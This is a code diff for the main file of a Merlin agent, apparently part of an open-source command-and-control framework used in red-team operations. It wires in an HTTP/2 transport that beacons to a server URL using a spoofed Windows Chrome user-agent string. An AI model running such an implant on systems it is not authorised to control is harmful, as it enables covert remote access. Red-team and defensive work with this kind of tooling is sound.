@@ -28,8 +28,9 @@ import (
 	"github.com/fatih/color"
 
 	// Merlin
-	"github.com/Ne0nd0g/merlin/pkg"
+	merlin "github.com/Ne0nd0g/merlin/pkg"
 	"github.com/Ne0nd0g/merlin/pkg/agent"
+	"github.com/Ne0nd0g/merlin/pkg/transport/http2"
 )
 
 // GLOBAL VARIABLES
@@ -53,7 +54,8 @@ func main() {
 	}
 
 	// Setup and run agent
-	a := agent.New(*protocol, *verbose, *debug)
+	transport := http2.New(*protocol, url, "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36")
+	a := agent.New(*protocol, *verbose, *debug, transport)
 	a.WaitTime = *sleep
 	a.Run(url)
 }
